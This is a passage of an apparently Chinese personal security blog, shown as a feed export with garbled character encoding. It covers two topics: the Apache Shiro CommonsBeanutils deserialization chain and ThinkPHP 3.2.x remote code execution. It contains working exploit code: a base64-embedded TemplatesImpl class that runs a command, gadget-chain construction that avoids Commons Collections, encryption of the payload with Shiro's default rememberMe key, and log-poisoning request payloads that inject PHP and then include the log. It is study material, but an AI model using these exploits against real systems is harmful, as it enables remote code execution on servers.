class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACABABpjb20vZ292dWxuL3NoaXJvYXR0YWNrL0V4cAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABIACwAAAAQAAQAMAAEADgAPAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAFAAEABUADQAWAAsAAAAEAAEAEAABABEAAAACABI=&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;clazz.toBytecode()&#125;);</span><br><span class="line">        <span class="comment">// setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        <span class="comment">// é˜²æ­¢åˆå§‹åŒ–æŠ¥é”™</span></span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†propertyå˜ä¸ºoutputProperties ä»è€Œå¯ä»¥åœ¨BeanComparator#compareèƒ½å¤Ÿè°ƒç”¨åˆ°TemplatesImpl#getOutputProperties</span></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do serialize</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(byteArrayOutputStream.toByteArray());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        Object o = (Object) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„è¿›è¡Œèµ‹å€¼</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ç›¸æ¯”äºysoserialé‡Œçš„CommonsBeanutils1åˆ©ç”¨é“¾ï¼Œæœ¬æ–‡çš„åˆ©ç”¨é“¾å»æ‰äº†å¯¹ java.math.BigInteger çš„ ä½¿ç”¨ï¼Œå› ä¸ºysoserialä¸ºäº†å…¼å®¹ property=lowestSetBit ï¼Œä½†å®é™…ä¸Šæˆ‘ä»¬å°† property è®¾ç½®ä¸ºnullå³å¯ã€‚</p>
</blockquote>
<h5 id="æ— CCä¾èµ–é“¾å­"><a href="#æ— CCä¾èµ–é“¾å­" class="headerlink" title="æ— CCä¾èµ–é“¾å­"></a>æ— CCä¾èµ–é“¾å­</h5><p>æŠŠCCä¾èµ–ç»™åˆ æ‰ä¹‹åï¼Œè®¡ç®—å™¨å¼¹ä¸å‡ºæ¥äº†ï¼Œè€Œå­˜åœ¨æŠ¥é”™</p>
<p>å› ä¸º<code>BeanComparator</code>ç±»ä¸­å¦‚æœä¸ç»™èµ‹å€¼çš„è¯ï¼Œ<code>this.comparator</code>ä¼šè¢«åˆå§‹åŒ–ä¸º<code>org.apache.commons.collections.comparators.ComparableComparator</code>ï¼Œè€Œè¿™ä¸ªç±»åˆæ˜¯CCä¸­çš„ï¼Œæ‰€ä»¥å°±ä¸èƒ½æ‰§è¡ŒæˆåŠŸäº†</p>
<p><img src="https://img-blog.csdnimg.cn/790d93cde7e7419599b7a0b9483cee1c.png" alt="image-20220629164939858"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.comparators.ComparableComparator;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/fdbf6cf496104ff6a3c8d2ebb050bb55.png" alt="image-20220629165135130"></p>
<p>æ‰€ä»¥è¦æ‰¾åˆ°å¯¹åº”çš„ç±»å»ä»£æ›¿<code>org.apache.commons.collections.comparators.ComparableComparator</code></p>
<blockquote>
<p>æ»¡è¶³çš„æ¡ä»¶ï¼š</p>
<ul>
<li>å®ç° java.util.Comparator æ¥å£ </li>
<li>å®ç° java.io.Serializable æ¥å£ </li>
<li>Javaã€shiroæˆ–commons-beanutilsè‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼º</li>
</ul>
</blockquote>
<p><code>CaseInsensitiveComparator</code>è¯¥ç±»æ˜¯Stringçš„å†…éƒ¨ç±»ã€‚å¹¶ä¸”<code>String.CASE_INSENSITIVE_ORDER</code>å°±å®ç°å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¼ å…¥<code>String.CASE_INSENSITIVE_ORDER</code>å°±å¥½äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER</span><br><span class="line">                                     = <span class="keyword">new</span> CaseInsensitiveComparator();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CaseInsensitiveComparator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">String</span>&gt;, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// use serialVersionUID from JDK 1.2.2 for interoperability</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8575799808933029326L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">        â€¦â€¦</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Replaces the de-serialized object. */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> CASE_INSENSITIVE_ORDER; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CBTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACABABpjb20vZ292dWxuL3NoaXJvYXR0YWNrL0V4cAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABIACwAAAAQAAQAMAAEADgAPAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAFAAEABUADQAWAAsAAAAEAAEAEAABABEAAAACABI=&quot;</span>);</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(Evil.class.getName());</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do serialize</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(byteArrayOutputStream.toByteArray());</span></span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        Object o = (Object) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„è¿›è¡Œèµ‹å€¼</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><p>ç»§ç»­ç”¨Pç¥çš„Demo</p>
<p>åœ¨ä¸Šé¢çš„expåé¢åŠ ä¸ŠåŠ å¯†ä»£ç ï¼Œå°†åŠ å¯†ä¹‹åçš„å­—ç¬¦ä¸²æ”¾åˆ°<code>rememberMe</code>ä¸Šï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line"><span class="keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">ByteSource ciphertext = aes.encrypt(byteArrayOutputStream.toByteArray(), key);</span><br><span class="line">System.out.printf(ciphertext.toString());</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/0b49927ef99643d298241d7a989fc489.png" alt="image-20220629170351741"></p>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>åºåˆ—åŒ–</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPæ¡†æ¶æ¼æ´å¤ç°</title>
    <url>/2022/05/15/ThinkPHP%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>å› ä¸ºè¿‘æœŸçŠ¶æ€ä¸æ˜¯å¾ˆå¥½ï¼Œæœ‰æ—¶å€™ç”šè‡³ä¸çŸ¥é“è¯¥å»åšä»€ä¹ˆï¼ˆæ˜æ˜è¿˜æœ‰é‚£ä¹ˆå¤šä¸œè¥¿æ²¡æœ‰å­¦ï¼‰ï¼Œæ‰“ç®—å¤ç°javaç›¸å…³çš„æ¼æ´çš„æ—¶å€™æ€»æ˜¯å› ä¸ºå„ç§åŸå› æ²¡åŠæ³•ä¸€ä¸‹å­å®Œæˆï¼Œæ¯æ¬¡éƒ½éœ€è¦é‡æ–°çœ‹ä¸€éï¼ˆå¿ƒç´¯äº†ï¼‰ã€‚</p>
<p>æœ€åè¿˜æ˜¯å†³å®šä¸€ä¸‹ä»”ç»†å¤ç°ä¸€ä¸‹ThinkPHPæ¼æ´ï¼Œéƒ½æ˜¯ä»¥å‰åšé¢˜æˆ–è€…æ¯”èµ›çš„æ—¶å€™é‡åˆ°çš„ï¼Œå°±å½“å¤ä¹ äº†ï¼Œä¹‹ååº”è¯¥ä¼šæ—¶ä¸æ—¶æ›´æ–°ä¸€ä¸‹ï¼Œç®—æ˜¯ä¸ªäººå­¦ä¹ ç¬”è®°ï¼Œå¦‚æœæœ‰ä»»ä½•é”™è¯¯çš„åœ°æ–¹æ¬¢è¿å¸ˆå‚…ä»¬æŒ‡æ­£</p>
<p>thinkphp3.2.xRCEã€thinkphp5.0.xRCEã€thinkphp5.1.xRCEã€yii2ååºåˆ—åŒ–â€¦â€¦</p>
</blockquote>
<span id="more"></span>

<h2 id="ThinkPHP3-2-xRCE"><a href="#ThinkPHP3-2-xRCE" class="headerlink" title="ThinkPHP3.2.xRCE"></a>ThinkPHP3.2.xRCE</h2><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>thinkphp3.2.3</p>
<p>win10</p>
<p>phpstudy8 php5.6</p>
<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><ul>
<li>debug true</li>
</ul>
<p>1.ç›´æ¥ä¸Špayload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2007/?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨æœ¬åœ°å‘ç°æ—¥å¿—æ–‡ä»¶å°†ä»£ç è®°å½•äº†,ä¸è¿‡å¦‚æœç›´æ¥ä¼ çš„è¯ä¼šå‡ºç°ä¹±ç ï¼Œæœ€å¥½ç”¨bpæŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.49.1:2007/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/22_05_13.log</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ä»£ç æˆåŠŸæ‰§è¡Œå•¦</p>
<p><img src="https://img-blog.csdnimg.cn/8f33c6b19e64454ebaeed6271480038d.png" alt="img"></p>
<ul>
<li>debug false</li>
</ul>
<p>åˆ©ç”¨æŠ¥é”™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2007/?c=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>



<h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>é¦–å…ˆä¼ å…¥çš„<code>m|c|a</code>ä¸ºç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œé€šè¿‡ä¿®æ”¹å˜é‡çš„å€¼ä½¿å¾—è¿›å…¥ç‰¹å®šçš„æ§åˆ¶å™¨ï¼Œè€Œåœ¨åé¢æˆ‘ä»¬ä¼ è¿›å»valueä¹Ÿä¼šä¼ è¿›<code>IndexController</code>çš„indexæ–¹æ³•ï¼Œå¹¶åœ¨assignä¹‹åå¯ä»¥åœ¨showæ–¹æ³•çš„æ—¶å€™å®ç°æ–‡ä»¶åŒ…å«</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220513175918430.png" alt="image-20220513175918430"></p>
<p><code>IndexController</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$value</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show(<span class="string">&#x27;â€¦â€¦&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œ<code>assign</code>,ç›´æ¥è·Ÿè¿›ï¼Œåœ¨è¿™é‡Œä¼šè°ƒç”¨åˆ°<code>View</code>ç±»çš„assignæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;view-&gt;assign(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>View::assign</code>ï¼Œå°†æˆ‘ä»¬ä¼ è¿›å»çš„å€¼ç»™<code>$this-&gt;tVar</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tVar   =  array_merge(<span class="keyword">$this</span>-&gt;tVar,<span class="variable">$name</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tVar[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>Controller:show</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$content</span>,<span class="variable">$charset</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$contentType</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;display(<span class="string">&#x27;&#x27;</span>,<span class="variable">$charset</span>,<span class="variable">$contentType</span>,<span class="variable">$content</span>,<span class="variable">$prefix</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>View:display</code>ï¼Œä¼šåœ¨fetchæ–¹æ³•ä¸­å°†<code>$this-&gt;tVar</code>è¿›è¡Œè§£æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$templateFile</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$charset</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$contentType</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    G(<span class="string">&#x27;viewStartTime&#x27;</span>);</span><br><span class="line">    <span class="comment">// è§†å›¾å¼€å§‹æ ‡ç­¾</span></span><br><span class="line">    Hook::listen(<span class="string">&#x27;view_begin&#x27;</span>,<span class="variable">$templateFile</span>);</span><br><span class="line">    <span class="comment">// è§£æå¹¶è·å–æ¨¡æ¿å†…å®¹</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;fetch(<span class="variable">$templateFile</span>,<span class="variable">$content</span>,<span class="variable">$prefix</span>);</span><br><span class="line">    <span class="comment">// è¾“å‡ºæ¨¡æ¿å†…å®¹</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;render(<span class="variable">$content</span>,<span class="variable">$charset</span>,<span class="variable">$contentType</span>);</span><br><span class="line">    <span class="comment">// è§†å›¾ç»“æŸæ ‡ç­¾</span></span><br><span class="line">    Hook::listen(<span class="string">&#x27;view_end&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8deea29be3ad40f7b0b4659127a430a9.png" alt="img"></p>
<p><code>Hook:listen</code>ï¼Œç”±äºæˆ‘ä»¬æ‰“å¼€äº†debugæ¨¡å¼ï¼Œä½¿å¾—è¿™äº›å€¼éƒ½ä¼šè¿›è¡Œè®°å½•ï¼Œå°±æ¯”å¦‚traceå°±ä¼šå®ç°æ—¥å¿—çš„æ ¼å¼å¹¶å†™å…¥ç›¸åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­</p>
<p>è€Œlistené‡Œé¢æœ€ä¸ºé‡è¦çš„å°±æ˜¯<code>exec</code>ï¼Œè¿™é‡Œä¼šå°†æ•´ä¸ª<code>$param</code>éƒ½ä¼šä¼ è¿›å»ï¼Œå³åŒ…æ‹¬äº†æˆ‘ä»¬è‡ªå·±å†™å…¥çš„value</p>
<p><img src="https://img-blog.csdnimg.cn/dcc11ff18e5c455a95236eb3b2e86153.png" alt="img"></p>
<p><code>Hook:exec</code>ï¼Œä¼šå»è°ƒç”¨æŸä¸ªç»§æ‰¿<code>Behavior</code>æŠ½è±¡ç±»çš„<code>run</code>æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$tag</span>,&amp;<span class="variable">$params</span>=<span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;Behavior&#x27;</span> == substr(<span class="variable">$name</span>,-<span class="number">8</span>) )&#123;</span><br><span class="line">        <span class="comment">// è¡Œä¸ºæ‰©å±•å¿…é¡»ç”¨runå…¥å£æ–¹æ³•</span></span><br><span class="line">        <span class="variable">$tag</span>    =   <span class="string">&#x27;run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$addon</span>   = <span class="keyword">new</span> <span class="variable">$name</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$addon</span>-&gt;<span class="variable">$tag</span>(<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

